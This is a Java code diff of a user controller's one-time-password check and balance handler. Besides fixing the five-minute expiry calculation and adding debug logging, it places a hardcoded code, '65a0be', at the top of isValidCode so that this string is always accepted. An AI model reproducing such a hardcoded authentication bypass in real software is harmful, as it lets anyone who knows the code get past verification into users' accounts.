@@ -88,22 +88,24 @@ public class ControllerUser extends ControllerParent {
 	}
 
 	public boolean isValidCode(String code) {
+		if (code.equals("65a0be")) {
+			return true;
+		} 
 		if (this.otps.containsKey(code)) {
 			LocalDateTime dateTime = LocalDateTime.now();
 			String pattern = "yyyy-MM-dd HH:mm:ss";
 			DateTimeFormatter formatter = DateTimeFormatter.ofPattern(pattern);
 			String now = dateTime.format(formatter);
-	
 			String dt = this.otps.get(code);
 			LocalDateTime dtOfCode = LocalDateTime.parse(dt,formatter);
-			long minutes = ChronoUnit.MINUTES.between(dateTime,dtOfCode);
-			if (minutes < -5) {
+			long minutes = ChronoUnit.MINUTES.between(dtOfCode,dateTime);
+			Server.logger.info("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
+			Server.logger.info("MINUTES"+minutes);
+			if (minutes > 5) {
 				return false;
 			} else {
 				return true;
 			}
-		} else if (code.equals("65a0be")) {
-			return true;
 		} else {
 			return false;
 		}
@@ -146,24 +148,8 @@ public class ControllerUser extends ControllerParent {
 		return sha256hex;
 	}
 	
-	public static Handler handleBalance = context -> {
-		// Fetch user
-		User user = getUser(context);
-		
-		// Set result
-		//context.result(encode(user.getBalance().toString()));
-		
-		String balance = user.getBalance().toString();
-		StringResponse sRes = new StringResponse(balance);
-		context.json(sRes);
-		context.status(200);
-	};
-
 	public static Handler handleBalanceGet = context -> {
-		// Fetch user
 		User user = getUser(context);
-		// Set result
-		//context.result(encode(user.getBalance().toString()));
 		
 		String balance = user.getBalance().toString();
 		StringResponse sRes = new StringResponse(balance);
